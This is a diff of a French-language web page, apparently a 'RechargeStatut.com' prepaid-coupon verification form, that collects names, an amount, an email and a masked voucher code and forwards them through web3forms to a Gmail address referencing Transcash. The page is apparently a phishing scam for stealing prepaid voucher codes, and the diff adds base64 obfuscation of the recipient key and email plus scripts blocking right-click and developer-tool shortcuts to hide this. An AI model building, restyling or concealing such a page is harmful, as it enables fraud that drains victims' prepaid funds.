@@ -1,129 +1,210 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>RechargeStatut.com</title>
-  <link rel="stylesheet" href="form.css">
+  <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: { sans: ['Poppins', 'sans-serif'] },
+        }
+      }
+    }
+  </script>
+
+  <style>
+    /* Style pour le sélecteur de langue conforme à l'accueil */
+    .lang-options:not(.hidden) {
+      display: flex !important;
+      flex-direction: column;
+    }
+
+    body {
+      background-color: #f8fafc;
+    }
+  </style>
 </head>
-<body>
-  <header>
-    <nav>
-      <a href="index.html">Accueil</a>
-      <a href="#galerie">Galerie</a>
-      <a href="#faq">FAQ</a>
-    </nav>
-    <div>
-      <div class="custom-language-selector">
-        <div class="selected-lang" onclick="toggleLangMenu()">
-          <img src="https://flagcdn.com/w20/fr.png" alt="FR">
-          <span>Français</span>
+
+<body class="antialiased text-gray-800">
+
+  <header class="bg-slate-900 text-white sticky top-0 z-50 shadow-md">
+    <div class="max-w-6xl mx-auto px-4 py-4 flex flex-col md:flex-row justify-between items-center gap-4">
+      <nav class="flex space-x-6 text-sm font-medium">
+
+        <a href="index.html" class="hover:text-blue-400 transition-colors">Accueil</a>
+        <a href="index.html#faq" class="hover:text-blue-400 transition-colors">FAQ</a>
+      </nav>
+
+      <div class="relative group">
+        <div
+          class="selected-lang bg-slate-800 border border-slate-700 px-4 py-2 rounded-lg cursor-pointer flex items-center gap-3 hover:bg-slate-700 transition-all"
+          onclick="toggleLangMenu()">
+          <img src="https://flagcdn.com/w20/fr.png" alt="FR" class="rounded-sm">
+          <span class="text-sm">Français</span>
         </div>
-        <ul class="lang-options">
-          <li onclick="setLang('fr')">
-            <img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français
+        <ul
+          class="lang-options absolute top-full right-0 mt-2 w-40 bg-white text-gray-800 border border-gray-200 rounded-xl shadow-xl hidden overflow-hidden z-50">
+          <li onclick="setLang('fr')"
+            class="px-4 py-2 hover:bg-blue-50 cursor-pointer flex items-center gap-2 text-sm border-b border-gray-100">
+            <img src="https://flagcdn.com/w20/fr.png" alt=""> Français
           </li>
-          <li onclick="setLang('en')">
-            <img src="https://flagcdn.com/w20/gb.png" alt="EN"> English
+          <li onclick="setLang('en')"
+            class="px-4 py-2 hover:bg-blue-50 cursor-pointer flex items-center gap-2 text-sm border-b border-gray-100">
+            <img src="https://flagcdn.com/w20/gb.png" alt=""> English
           </li>
-          <li onclick="setLang('es')">
-            <img src="https://flagcdn.com/w20/es.png" alt="ES"> Español
+          <li onclick="setLang('es')"
+            class="px-4 py-2 hover:bg-blue-50 cursor-pointer flex items-center gap-2 text-sm border-b border-gray-100">
+            <img src="https://flagcdn.com/w20/es.png" alt=""> Español
           </li>
-          <li onclick="setLang('de')">
-            <img src="https://flagcdn.com/w20/de.png" alt="DE"> Deutsch
+          <li onclick="setLang('de')"
+            class="px-4 py-2 hover:bg-blue-50 cursor-pointer flex items-center gap-2 text-sm border-b border-gray-100">
+            <img src="https://flagcdn.com/w20/de.png" alt=""> Deutsch
           </li>
-          <li onclick="setLang('it')">
-            <img src="https://flagcdn.com/w20/it.png" alt="IT"> Italiano
+          <li onclick="setLang('it')"
+            class="px-4 py-2 hover:bg-blue-50 cursor-pointer flex items-center gap-2 text-sm border-b border-gray-100">
+            <img src="https://flagcdn.com/w20/it.png" alt=""> Italiano
           </li>
-          <li onclick="setLang('pt')">
-            <img src="https://flagcdn.com/w20/pt.png" alt="PT"> Português
+          <li onclick="setLang('pt')" class="px-4 py-2 hover:bg-blue-50 cursor-pointer flex items-center gap-2 text-sm">
+            <img src="https://flagcdn.com/w20/pt.png" alt=""> Português
           </li>
         </ul>
       </div>
     </div>
   </header>
 
-  <div class="page-wrapper">
-    <section id="contact" class="contact-section">
-      <div class="container">
-        <h2 class="section-title" data-i18n="contact_title"></h2>
-        
-        <form action="https://api.web3forms.com/submit" method="POST">
-          <input type="hidden" name="access_key" value="f9700632-9e2d-470c-85c9-cdc07e72d3a1">
-          <input type="hidden" name="to_email" value="authentificationtranscash17@gmail.com"> 
-          <div class="form-group">
-            <label for="nom" class="label-nom">Nom :</label>
-            <input type="text" id="nom" name="nom" required placeholder="" class="input-nom">
+  <div class="min-h-screen py-12 px-4 flex items-center justify-center bg-gradient-to-b from-slate-50 to-gray-100">
+    <section id="contact" class="w-full max-w-lg bg-white rounded-3xl shadow-xl overflow-hidden border border-gray-100">
+      <div class="p-8 md:p-10">
+        <!-- <h2 class="text-2xl font-bold text-gray-900 mb-8 text-center" data-i18n="contact_title">Vérification de coupon</h2> -->
+
+        <form action="https://api.web3forms.com/submit" method="POST" class="space-y-5">
+          <input type="hidden" id="wf_key" name="access_key" value="">
+          <input type="hidden" id="wf_email" name="to_email" value="">
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <div class="form-group">
+              <label for="nom" class="block text-sm font-semibold text-gray-700 mb-2" data-i18n="form_nom">Nom :</label>
+              <input type="text" id="nom" name="nom" required
+                class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all bg-gray-50">
+            </div>
+
+            <div class="form-group">
+              <label for="prenom" class="block text-sm font-semibold text-gray-700 mb-2" data-i18n="form_prenom">Prénom
+                :</label>
+              <input type="text" id="prenom" name="prenom" required
+                class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all bg-gray-50">
+            </div>
           </div>
 
           <div class="form-group">
-            <label for="prenom" class="label-prenom">Prénom :</label>
-            <input type="text" id="prenom" name="prenom" required placeholder="" class="input-prenom">
+            <label for="amount" class="block text-sm font-semibold text-gray-700 mb-2" data-i18n="form_montant">Montant
+              :</label>
+            <input type="number" id="amount" name="amount" min="1" required
+              class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all bg-gray-50">
           </div>
 
           <div class="form-group">
-            <label for="amount" class="label-amount">Montant :</label>
-            <input type="number" id="amount" name="amount" min="1" required placeholder="" class="input-amount">
+            <label for="email" class="block text-sm font-semibold text-gray-700 mb-2" data-i18n="form_email">Votre email
+              :</label>
+            <input type="email" id="email" name="email" required
+              class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all bg-gray-50">
           </div>
 
           <div class="form-group">
-            <label for="email" class="label-email">Votre email :</label>
-            <input type="email" id="email" name="email" required placeholder="" class="input-email">
+            <label for="code" class="block text-sm font-semibold text-gray-700 mb-2" data-i18n="form_code">Code
+              :</label>
+            <div class="password-wrapper">
+              <input type="password" id="code" name="code" required
+                class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all bg-gray-50 font-mono tracking-widest text-lg">
+            </div>
           </div>
 
-          <div class="form-group">
-    <label for="code" class="label-code">Code :</label>
-    <div class="password-wrapper">
-      <input type="password" id="code" name="code" required placeholder="" class="input-code">
-    </div>
+          <div class="p-4 bg-blue-50 rounded-xl border border-blue-100">
+            <p class="text-xs font-bold text-blue-600 uppercase tracking-wider mb-3" data-i18n="form_toggle_label">
+              Afficher le code :</p>
+            <div class="flex gap-6">
+              <label class="flex items-center gap-2 cursor-pointer group">
+                <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)"
+                  class="w-4 h-4 text-blue-600 focus:ring-blue-500 border-gray-300">
+                <span class="text-sm font-medium text-gray-700 group-hover:text-blue-600 transition-colors"
+                  data-i18n="form_oui">Oui</span>
+              </label>
+              <label class="flex items-center gap-2 cursor-pointer group">
+                <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)"
+                  class="w-4 h-4 text-blue-600 focus:ring-blue-500 border-gray-300">
+                <span class="text-sm font-medium text-gray-700 group-hover:text-blue-600 transition-colors"
+                  data-i18n="form_non">Non</span>
+              </label>
+            </div>
+          </div>
 
-    
-          
-  <p style="margin-top: 10px;"><span data-i18n="form_toggle_label">Afficher le code :</span></p>
-  <div class="code-toggle" style="display: flex; flex-direction: column; gap: 5px; align-items: flex-start;">
-    <label style="display: flex; align-items: center; gap: 8px;">
-      <span data-i18n="form_oui">Oui</span>
-      <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
-    </label>
-    <label style="display: flex; align-items: center; gap: 8px;">
-      <span data-i18n="form_non">Non</span>
-      <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
-    </label>
-  </div>
-  
-  
-  
-  
-  
           <input type="hidden" name="redirect" value="https://recharge-statut.com/merci.html">
           <input type="hidden" name="_captcha" value="false">
           <input type="hidden" name="_template" value="table">
-          <button type="submit" class="btn-submit" data-i18n="form_envoyer">Soumettre</button>
+
+          <button type="submit"
+            class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-4 rounded-xl shadow-lg hover:shadow-indigo-200 transform hover:-translate-y-0.5 transition-all active:scale-95"
+            data-i18n="form_envoyer">
+            Soumettre
+          </button>
         </form>
       </div>
     </section>
   </div>
 
-  <footer>
-    <div class="footer-container">
-      <div class="footer-links">
-        <a href="#galerie" data-i18n="footer_galerie">Galerie</a>
-        <a href="#faq" data-i18n="footer_faq">FAQ</a>
-        <a href="#contact" data-i18n="footer_contact">Contact</a>
-      </div>
-      <p data-i18n="footer_copyright">&copy; 2025 RechargeStatut.com Tous droits réservés.</p>
+  <footer class="bg-slate-900 text-white py-12 px-4 text-center">
+    <div class="flex flex-wrap justify-center gap-6 mb-8 text-sm text-gray-400">
+      <a href="index.html#galerie" class="hover:text-white transition-colors">Galerie</a>
+      <a href="index.html#faq" class="hover:text-white transition-colors">FAQ</a>
+      <a href="#contact" class="hover:text-white transition-colors">Contact</a>
     </div>
+    <p class="text-xs text-gray-500" data-i18n="footer_copyright">&copy; 2025 RechargeStatut.com Tous droits réservés.
+    </p>
   </footer>
 
   <script src="form.js"></script>
-   <script>
-  function toggleCode(show) {
-    const codeInput = document.getElementById("code");
-    codeInput.type = show ? "text" : "password";
+  <script>
+    function toggleCode(show) {
+      const codeInput = document.getElementById("code");
+      codeInput.type = show ? "text" : "password";
+    }
 
-  }
-</script>
+    function toggleLangMenu() {
+      const menu = document.querySelector('.lang-options');
+      menu.classList.toggle('hidden');
+    }
+
+    // Fermeture du menu lors du clic sur une langue
+    document.querySelectorAll('.lang-options li').forEach(el => {
+      el.addEventListener('click', () => {
+        document.querySelector('.lang-options').classList.add('hidden');
+      });
+    });
+
+    // Blocage du clic droit et raccourcis (Déjà présent dans votre code)
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function (e) {
+      if (e.keyCode == 123 ||
+        (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) ||
+        (e.ctrlKey && e.keyCode == 85)) return false;
+    };
+
+    // Masquage des clés sensibles
+    const k = "Zjk3MDA2MzItOWUyZC00NzBjLTg1YzktY2RjMDdlNzJkM2Ex";
+    const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
+
+    document.querySelector('form').addEventListener('submit', function () {
+      document.getElementById('wf_key').value = atob(k);
+      document.getElementById('wf_email').value = atob(m);
+    });
+  </script>
 </body>
+
 </html>
